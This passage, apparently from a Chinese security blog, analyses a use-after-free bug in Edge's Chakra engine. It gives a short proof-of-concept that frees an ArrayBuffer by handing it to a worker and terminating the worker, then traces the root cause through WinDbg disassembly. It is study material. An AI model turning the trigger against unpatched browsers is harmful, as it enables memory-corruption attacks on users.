class="undefined">worker.terminate();</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">test case</span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>使用EdgeDbg启动edge，并直接指定URL，效果如下（当然在这里我们直接指定的是test.html的本地存放路径）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">H:\dev\C\EdgeDbg&gt;EdgeDbg_x86.exe http://example.com</span><br><span class="line">* Terminating any running instances of Microsoft Edge...</span><br><span class="line">* Activating Microsoft Edge and opening http://example.com...</span><br><span class="line">+ MicrosoftEdge.exe process id = 2744</span><br><span class="line">* Waiting for MicrosoftEdgeCP.exe process to start...</span><br><span class="line">+ MicrosoftEdgeCP.exe process id = 2748</span><br><span class="line">+ RuntimeBroker.exe process id = 2936</span><br><span class="line">+ browser_broker.exe process id = 3088</span><br><span class="line">+ ApplicationFrameHost.exe process id = 1234</span><br><span class="line"></span><br><span class="line">H:\dev\C\EdgeDbg&gt;</span><br></pre></td></tr></table></figure></p><p>然后在windbg里attach上MicrosoftEdgeCP.exe的pid即可。<br>在windbg里输入，设置符号服务器。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.sympath SRV*c:\localsymbols*http://msdl.microsoft.com/download/symbols</span><br></pre></td></tr></table></figure></p><p>然后下断，输入g继续运行，观察是否断下，若顺利断下，则代表环境测试通过。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bu chakra!Js::Math::Cosh</span><br><span class="line">bu chakra!Js::ArrayBuffer::ClearParentsLength</span><br></pre></td></tr></table></figure></p><h2 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h2><h3 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="comment">// Math.cosh.call([1,2,3]) </span></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x10000</span>); <span class="comment">//[0]</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> view = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(buffer); <span class="comment">//[1]</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> worker = <span class="keyword">new</span> Worker(<span class="string">'uaf1.js'</span>);</span></span><br><span class="line"><span class="javascript">worker.postMessage(buffer,[buffer]); <span class="comment">//[2]</span></span></span><br><span class="line"><span class="javascript">worker.terminate(); <span class="comment">//[2]</span></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">test case</span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h3><p>UAF(Use After Free)：即释放后使用。<br>内存释放后未将pointer置为NULL，变成Dangling pointer；将Dangling pointer所指向的内存重新分配回来，且尽可能使该内存中的内容可控。</p><h3 id="0"><a href="#0" class="headerlink" title="[0]"></a>[0]</h3><p><strong>创建JSArrayBuffer Object，并通过VirtualAlloc分配内存空间buffer，JSArrayBuffer Object存有指向其申请的缓冲区的引用</strong></p><p>uf chakra!Js::ArrayBuffer::NewInstance<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0:010&gt; uf chakra!Js::ArrayBuffer::NewInstance </span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">00007ffa`d2cb2633 e828000000 call chakra!Js::ArrayBuffer::GetByteLengthFromVar (00007ffa`d2cb2660)</span><br><span class="line">chakra!Js::ArrayBuffer::NewInstance+0xc8:</span><br><span class="line">00007ffa`d2cb2638 488b17 mov rdx,qword ptr [rdi]</span><br><span class="line">00007ffa`d2cb263b 8bc8 mov ecx,eax</span><br><span class="line">00007ffa`d2cb263d 488b9298040000 mov rdx,qword ptr [rdx+498h]</span><br><span class="line">00007ffa`d2cb2644 e8733dfdff call chakra!Js::JavascriptArrayBuffer::Create (00007ffa`d2c863bc)//------&gt;Create Buffer</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p><p>uf chakra!Js::JavascriptArrayBuffer::Create<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0:010&gt; uf chakra!Js::JavascriptArrayBuffer::Create</span><br><span class="line">chakra!Js::JavascriptArrayBuffer::Create:</span><br><span class="line">...</span><br><span class="line">00007ffa`d2c863fb e888010000 call chakra!Js::JavascriptArrayBuffer::JavascriptArrayBuffer (00007ffa`d2c86588)</span><br><span class="line">...</span><br><span class="line">00007ffa`d2c8642a c3 ret</span><br></pre></td></tr></table></figure></p><p>uf chakra!Js::JavascriptArrayBuffer::JavascriptArrayBuffer<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">0:010&gt; uf chakra!Js::JavascriptArrayBuffer::JavascriptArrayBuffer</span><br><span class="line">chakra!Js::JavascriptArrayBuffer::JavascriptArrayBuffer:</span><br><span class="line">...</span><br><span class="line">00007ffa`d2c8659e e89dffffff call chakra!Js::JavascriptArrayBuffer::IsValidVirtualBufferLength (00007ffa`d2c86540)//-----&gt;根据这个结果决定使用AllocWrapper还是malloc，length&gt;=0x10000则使用AllocWrapper</span><br><span class="line">00007ffa`d2c865a3 4c8b0ddec35600 mov r9,qword ptr [chakra!_imp_malloc (00007ffa`d31f2988)]</span><br><span class="line">00007ffa`d2c865aa 488d0d4f920200 lea rcx,[chakra!Js::JavascriptArrayBuffer::AllocWrapper (00007ffa`d2caf800)]</span><br><span class="line">00007ffa`d2c865b1 4c8b442440 mov r8,qword ptr [rsp+40h]</span><br><span class="line">00007ffa`d2c865b6 84c0 test al,al</span><br><span class="line">00007ffa`d2c865b8 8b542438 mov edx,dword ptr [rsp+38h]</span><br><span class="line">00007ffa`d2c865bc 4c0f45c9 cmovne r9,rcx</span><br><span class="line">00007ffa`d2c865c0 488bcb mov rcx,rbx</span><br><span class="line">00007ffa`d2c865c3 e85c010000 call chakra!Js::ArrayBuffer::ArrayBuffer&lt;void * __ptr64 (__cdecl*)(unsigned __int64)&gt; (00007ffa`d2c86724)</span><br><span class="line">00007ffa`d2c865c8 488d05512b5100 lea rax,[chakra!Js::JavascriptArrayBuffer::`vftable&apos; (00007ffa`d3199120)]</span><br><span class="line">00007ffa`d2c865cf 488903 mov qword ptr [rbx],rax</span><br><span class="line">00007ffa`d2c865d2 488bc3 mov rax,rbx</span><br><span class="line">00007ffa`d2c865d5 4883c420 add rsp,20h</span><br><span class="line">00007ffa`d2c865d9 5b pop rbx</span><br><span class="line">00007ffa`d2c865da c3 ret</span><br></pre></td></tr></table></figure></p><p>uf Js::JavascriptArrayBuffer::AllocWrapper是VirtualAlloc的封装<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">0:010&gt; uf Js::JavascriptArrayBuffer::AllocWrapper </span><br><span class="line">chakra!Js::JavascriptArrayBuffer::AllocWrapper:</span><br><span class="line">00007ffa`d2caf800 48894c2408 mov qword ptr [rsp+8],rcx</span><br><span class="line">00007ffa`d2caf805 53 push rbx</span><br><span class="line">00007ffa`d2caf806 4883ec20 sub rsp,20h</span><br><span class="line">00007ffa`d2caf80a 33c9 xor ecx,ecx</span><br><span class="line">00007ffa`d2caf80c 48ba0000000001000000 mov rdx,100000000h</span><br><span class="line">00007ffa`d2caf816 41b800200000 mov r8d,2000h</span><br><span class="line">00007ffa`d2caf81c 448d4901 lea r9d,[rcx+1]</span><br><span class="line">00007ffa`d2caf820 ff15522c5400 call qword ptr [chakra!_imp_VirtualAlloc (00007ffa`d31f2478)]</span><br><span class="line">00007ffa`d2caf826 488bd8 mov rbx,rax</span><br><span class="line">00007ffa`d2caf829 4885c0 test rax,rax</span><br><span class="line">00007ffa`d2caf82c 7429 je chakra!Js::JavascriptArrayBuffer::AllocWrapper+0x57 (00007ffa`d2caf857) Branch</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-25-120347.jpg" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-25-120421.jpg" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0:010&gt; dqs 000001d9`15dc7e80 l1</span><br><span class="line">000001d9`15dc7e80 00007ffa`d3199120 chakra!Js::JavascriptArrayBuffer::`vftable&apos;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">0:010&gt; dq 000001d9`15dc7e80----&gt;JSArrayBuffer Object，存有指向buffer的pointer</span><br><span class="line">000001d9`15dc7e80 00007ffa`d3199120 000001d9`15ebae80</span><br><span class="line">000001d9`15dc7e90 00000000`00000000 00000000`00000000</span><br><span class="line">000001d9`15dc7ea0 00000000`00000000 00000000`00000000</span><br><span class="line">000001d9`15dc7eb0 000001da`15ff0000------&gt;buffer 00000000`00010000</span><br></pre></td></tr></table></figure></p><h3 id="1"><a href="#1" class="headerlink" title="[1]"></a>[1]</h3><p>创建JSTypedArray Object，存有指向JSArrayBuffer的引用和<strong>JSArrayBuffer Object申请的缓冲区的引用</strong></p><p>bu chakra!Js::TypedArrayBase::CreateNewInstance<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">0:010&gt; ub $ip</span><br><span class="line">chakra!Js::TypedArray&lt;unsigned int,0,0&gt;::NewInstance+0x96:</span><br><span class="line">00007ffa`d2c50d66 0f8497912700 je chakra!UnifiedRegex::AltNode::IsCharTrieArm+0x400b3 (00007ffa`d2ec9f03)</span><br><span class="line">00007ffa`d2c50d6c 4885db test rbx,rbx</span><br><span class="line">00007ffa`d2c50d6f 0f857e912700 jne chakra!UnifiedRegex::AltNode::IsCharTrieArm+0x400a3 (00007ffa`d2ec9ef3)</span><br><span class="line">00007ffa`d2c50d75 4c8d0d34000000 lea r9,[chakra!Js::TypedArray&lt;unsigned int,0,0&gt;::Create (00007ffa`d2c50db0)]</span><br><span class="line">00007ffa`d2c50d7c 41b804000000 mov r8d,4</span><br><span class="line">00007ffa`d2c50d82 488bd6 mov rdx,rsi</span><br><span class="line">00007ffa`d2c50d85 488d4c2420 lea rcx,[rsp+20h]</span><br><span class="line">00007ffa`d2c50d8a e805080000 call chakra!Js::TypedArrayBase::CreateNewInstance (00007ffa`d2c51594)</span><br><span class="line">0:010&gt; u $ip</span><br><span class="line">chakra!Js::TypedArray&lt;unsigned int,0,0&gt;::NewInstance+0xbf:</span><br><span class="line">00007ffa`d2c50d8f 4084ff test dil,dil</span><br><span class="line">00007ffa`d2c50d92 0f8580912700 jne chakra!UnifiedRegex::AltNode::IsCharTrieArm+0x400c8 (00007ffa`d2ec9f18)</span><br><span class="line">00007ffa`d2c50d98 4883c430 add rsp,30h</span><br><span class="line">00007ffa`d2c50d9c 5f pop rdi</span><br><span class="line">00007ffa`d2c50d9d 5e pop rsi</span><br><span class="line">00007ffa`d2c50d9e 5b pop rbx</span><br><span class="line">00007ffa`d2c50d9f c3 ret</span><br><span class="line">00007ffa`d2c50da0 cc int 3</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-25-120742.png" alt=""></p><h3 id="2"><a href="#2" class="headerlink" title="[2]"></a>[2]</h3><ul><li>worker.postMessage(buffer,[buffer]);<br>移交buffer的所有权给worker线程</li><li>worker.terminate();<br>结束worker线程，触发buffer的释放操作</li></ul><p><strong>chakra里这种结束线程并释放buffer的操作是我以前没有了解过的，而这也是这个漏洞的关键之一。</strong></p><h3 id="Free-but-no-set-NULL"><a href="#Free-but-no-set-NULL" class="headerlink" title="Free but no set NULL"></a>Free but no set NULL</h3><p>将长度设置为0，但是未将View对<strong>ArrayBuffer Object对象申请的缓冲区的引用</strong>置NULL。</p><p>bu chakra!Js::ArrayBuffer::DetachAndGetState<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0:010&gt; bu chakra!Js::ArrayBuffer::DetachAndGetState</span><br><span class="line">0:010&gt; g</span><br><span class="line">Breakpoint 3 hit</span><br><span class="line">chakra!Js::ArrayBuffer::DetachAndGetState:</span><br><span class="line">00007ffa`d30d8ab0 48894c2408 mov qword ptr [rsp+8],rcx ss:000000b0`396fb640=000001d915dc7e80</span><br><span class="line">0:010&gt; uf .</span><br><span class="line">chakra!Js::ArrayBuffer::DetachAndGetState:</span><br><span class="line">...</span><br><span class="line">00007ffa`d30d8b0a e8bdfdffff call chakra!Js::ArrayBuffer::ClearParentsLength (00007ffa`d30d88cc)</span><br><span class="line">...</span><br><span class="line">00007ffa`d30d8b46 c3 ret</span><br></pre></td></tr></table></figure></p><p>call chakra!Js::ArrayBuffer::ClearParentsLength<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-25-120527.jpg" alt=""></p><ul><li>TypeId<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line">enum TypeId</span><br><span class="line">&#123;</span><br><span class="line">    TypeIds_Undefined = 0,</span><br><span class="line">    TypeIds_Null = 1,</span><br><span class="line"></span><br><span class="line">    TypeIds_UndefinedOrNull =  TypeIds_Null,</span><br><span class="line"></span><br><span class="line">    TypeIds_Boolean = 2,</span><br><span class="line"></span><br><span class="line">    // backend typeof() == &quot;number&quot; is true for typeIds</span><br><span class="line">    // between TypeIds_FirstNumberType &lt;= typeId &lt;= TypeIds_LastNumberType</span><br><span class="line">    TypeIds_Integer = 3,</span><br><span class="line">    TypeIds_FirstNumberType = TypeIds_Integer,</span><br><span class="line">    TypeIds_Number = 4,</span><br><span class="line">    TypeIds_Int64Number = 5,</span><br><span class="line">    TypeIds_UInt64Number = 6,</span><br><span class="line">    TypeIds_LastNumberType = TypeIds_UInt64Number,</span><br><span class="line"></span><br><span class="line">    TypeIds_String = 7,</span><br><span class="line">    TypeIds_Symbol = 8,</span><br><span class="line"></span><br><span class="line">    TypeIds_LastToPrimitiveType = TypeIds_Symbol,</span><br><span class="line"></span><br><span class="line">    TypeIds_Enumerator = 9,</span><br><span class="line">    TypeIds_VariantDate = 10,</span><br><span class="line"></span><br><span class="line">    // SIMD types </span><br><span class="line">    //[Please maintain Float32x4 as the first SIMDType and Bool8x16 as the last]</span><br><span class="line">    TypeIds_SIMDFloat32x4 = 11,</span><br><span class="line">    TypeIds_SIMDFloat64x2 = 12,</span><br><span class="line">    TypeIds_SIMDInt32x4 = 13,</span><br><span class="line">    TypeIds_SIMDInt16x8 = 14,</span><br><span class="line">    TypeIds_SIMDInt8x16 = 15,</span><br><span class="line"></span><br><span class="line">    TypeIds_SIMDUint32x4 = 16,</span><br><span class="line">    TypeIds_SIMDUint16x8 = 17,</span><br><span class="line">    TypeIds_SIMDUint8x16 = 18,</span><br><span class="line"></span><br><span class="line">    TypeIds_SIMDBool32x4 = 19,</span><br><span class="line">    TypeIds_SIMDBool16x8 = 20,</span><br><span class="line">    TypeIds_SIMDBool8x16 = 21,</span><br><span class="line">    TypeIds_LastJavascriptPrimitiveType = TypeIds_SIMDBool8x16,</span><br><span class="line"></span><br><span class="line">    TypeIds_HostDispatch = 22,</span><br><span class="line">    TypeIds_WithScopeObject = 23,</span><br><span class="line">    TypeIds_UndeclBlockVar = 24,</span><br><span class="line"></span><br><span class="line">    TypeIds_LastStaticType = TypeIds_UndeclBlockVar,</span><br><span class="line"></span><br><span class="line">    TypeIds_Proxy = 25,</span><br><span class="line">    TypeIds_Function = 26,</span><br><span class="line"></span><br><span class="line">    //</span><br><span class="line">    // The backend expects only objects whose typeof() === &quot;object&quot; to have a</span><br><span class="line">    // TypeId &gt;= TypeIds_Object. Only &apos;null&apos; is a special case because it</span><br><span class="line">    // has a static type.</span><br><span class="line">    //</span><br><span class="line">    TypeIds_Object = 27,</span><br><span class="line">    TypeIds_Array = 28,</span><br><span class="line">    TypeIds_ArrayFirst = TypeIds_Array,</span><br><span class="line">    TypeIds_NativeIntArray = 29,</span><br><span class="line">  #if ENABLE_COPYONACCESS_ARRAY</span><br><span class="line">    TypeIds_CopyOnAccessNativeIntArray = 30,</span><br><span class="line">  #endif</span><br><span class="line">    TypeIds_NativeFloatArray = 31,</span><br><span class="line">    TypeIds_ArrayLast = TypeIds_NativeFloatArray,</span><br><span class="line">    TypeIds_Date = 32,</span><br><span class="line">    TypeIds_RegEx = 33,</span><br><span class="line">    TypeIds_Error = 34,</span><br><span class="line">    TypeIds_BooleanObject = 35,</span><br><span class="line">    TypeIds_NumberObject = 36,</span><br><span class="line">    TypeIds_StringObject = 37,</span><br><span class="line">    TypeIds_SIMDObject = 38,</span><br><span class="line">    TypeIds_Arguments = 39,</span><br><span class="line">    TypeIds_ES5Array = 40,</span><br><span class="line">    TypeIds_ArrayBuffer = 41,</span><br><span class="line">    TypeIds_Int8Array = 42,</span><br><span class="line">    TypeIds_TypedArrayMin = TypeIds_Int8Array,</span><br><span class="line">    TypeIds_TypedArraySCAMin = TypeIds_Int8Array, // Min SCA supported TypedArray TypeId</span><br><span class="line">    TypeIds_Uint8Array = 43,</span><br><span class="line">    TypeIds_Uint8ClampedArray = 44,</span><br><span class="line">    TypeIds_Int16Array = 45,</span><br><span class="line">    TypeIds_Uint16Array = 46,</span><br><span class="line">    TypeIds_Int32Array = 47,</span><br><span class="line">    TypeIds_Uint32Array = 48,//----&gt;0x30</span><br><span class="line">    TypeIds_Float32Array = 49,</span><br><span class="line">    TypeIds_Float64Array = 50,</span><br><span class="line">    TypeIds_TypedArraySCAMax = TypeIds_Float64Array, // Max SCA supported TypedArray TypeId</span><br><span class="line">    TypeIds_Int64Array = 51,</span><br><span class="line">    TypeIds_Uint64Array = 52,</span><br><span class="line">    TypeIds_CharArray = 53,</span><br><span class="line">    TypeIds_BoolArray = 54,</span><br><span class="line">    TypeIds_TypedArrayMax = TypeIds_BoolArray,</span><br><span class="line">    TypeIds_EngineInterfaceObject = 55,</span><br><span class="line">    TypeIds_DataView = 56,</span><br><span class="line">    TypeIds_WinRTDate = 57,</span><br><span class="line">    TypeIds_Map = 58,</span><br><span class="line">    TypeIds_Set = 59,</span><br><span class="line">    TypeIds_WeakMap = 60,</span><br><span class="line">    TypeIds_WeakSet = 61,</span><br><span class="line">    TypeIds_SymbolObject = 62,</span><br><span class="line">    TypeIds_ArrayIterator = 63,</span><br><span class="line">    TypeIds_MapIterator = 64,</span><br><span class="line">    TypeIds_SetIterator = 65,</span><br><span class="line">    TypeIds_StringIterator = 66,</span><br><span class="line">    TypeIds_JavascriptEnumeratorIterator = 67,      /* Unused */</span><br><span class="line">    TypeIds_Generator = 68,</span><br><span class="line">    TypeIds_Promise = 69,</span><br><span class="line">    TypeIds_SharedArrayBuffer = 70,</span><br><span class="line"></span><br><span class="line">    TypeIds_WebAssemblyModule = 71,</span><br><span class="line">    TypeIds_WebAssemblyInstance = 72,</span><br><span class="line">    TypeIds_WebAssemblyMemory = 73,</span><br><span class="line">    TypeIds_WebAssemblyTable = 74,</span><br><span class="line"></span><br><span class="line">    TypeIds_LastBuiltinDynamicObject = TypeIds_WebAssemblyTable,</span><br><span class="line">    TypeIds_GlobalObject = 75,</span><br><span class="line">    TypeIds_ModuleRoot = 76,</span><br><span class="line">    TypeIds_LastTrueJavascriptObjectType = TypeIds_ModuleRoot,</span><br><span class="line"></span><br><span class="line">    TypeIds_HostObject = 77,</span><br><span class="line">    TypeIds_ActivationObject = 78,</span><br><span class="line">    TypeIds_SpreadArgument = 79,</span><br><span class="line">    TypeIds_ModuleNamespace = 80,</span><br><span class="line">    TypeIds_ListIterator = 81,</span><br><span class="line"></span><br><span class="line">    TypeIds_Limit //add a new TypeId before TypeIds_Limit or before TypeIds_LastTrueJavascriptObjectType</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul><p><code>TypeIds_Uint32Array = 48,//----&gt;0x30</code><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-25-120854.jpg" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">0:010&gt; uf chakra!Js::ArrayBuffer::ClearParentsLength</span><br><span class="line">chakra!Js::ArrayBuffer::ClearParentsLength:</span><br><span class="line">00007ffa`d30d88cc 4889542410 mov qword ptr [rsp+10h],rdx</span><br><span class="line">00007ffa`d30d88d1 48894c2408 mov qword ptr [rsp+8],rcx</span><br><span class="line">00007ffa`d30d88d6 4883ec28 sub rsp,28h</span><br><span class="line">00007ffa`d30d88da 488b4c2438 mov rcx,qword ptr [rsp+38h]</span><br><span class="line">00007ffa`d30d88df 4885c9 test rcx,rcx----&gt;if TypedArrayBuffer==NULL,则直接return</span><br><span class="line">00007ffa`d30d88e2 742d je chakra!Js::ArrayBuffer::ClearParentsLength+0x45 (00007ffa`d30d8911) Branch--&gt;return</span><br><span class="line"></span><br><span class="line">chakra!Js::ArrayBuffer::ClearParentsLength+0x18:</span><br><span class="line">00007ffa`d30d88e4 488bc1 mov rax,rcx</span><br><span class="line">00007ffa`d30d88e7 48c1e830 shr rax,30h</span><br><span class="line">00007ffa`d30d88eb 4883f801 cmp rax,1-----&gt;如果是一个small int值，那么其右移48位得到的值应该是1，不是TypedArray Object，则直接return</span><br><span class="line">00007ffa`d30d88ef 7420 je chakra!Js::ArrayBuffer::ClearParentsLength+0x45 (00007ffa`d30d8911) Branch ---&gt;return</span><br><span class="line"></span><br><span class="line">chakra!Js::ArrayBuffer::ClearParentsLength+0x25:</span><br><span class="line">00007ffa`d30d88f1 e8fa8cd4ff call chakra!Js::JavascriptNumber::Is_NoTaggedIntCheck (00007ffa`d2e215f0)</span><br><span class="line">00007ffa`d30d88f6 84c0 test al,al-----&gt;如果是一个NoTaggedInt值，不是TypedArray Object，则直接return</span><br><span class="line">00007ffa`d30d88f8 7517 jne chakra!Js::ArrayBuffer::ClearParentsLength+0x45 (00007ffa`d30d8911) Branch----&gt;return</span><br><span class="line"></span><br><span class="line">chakra!Js::ArrayBuffer::ClearParentsLength+0x2e:</span><br><span class="line">00007ffa`d30d88fa 488b4108 mov rax,qword ptr [rcx+8]</span><br><span class="line">00007ffa`d30d88fe 83382a cmp dword ptr [rax],2Ah //小于0x2A即42，即非TypedArray，则return</span><br><span class="line">00007ffa`d30d8901 7c0e jl chakra!Js::ArrayBuffer::ClearParentsLength+0x45 (00007ffa`d30d8911) Branch //--&gt;return</span><br><span class="line"></span><br><span class="line">chakra!Js::ArrayBuffer::ClearParentsLength+0x37:</span><br><span class="line">00007ffa`d30d8903 833836 cmp dword ptr [rax],36h //大于0x2A(42)，小于等于0x36(54)，则将长度置为0</span><br><span class="line"></span><br><span class="line">    TypeIds_Uint8Array = 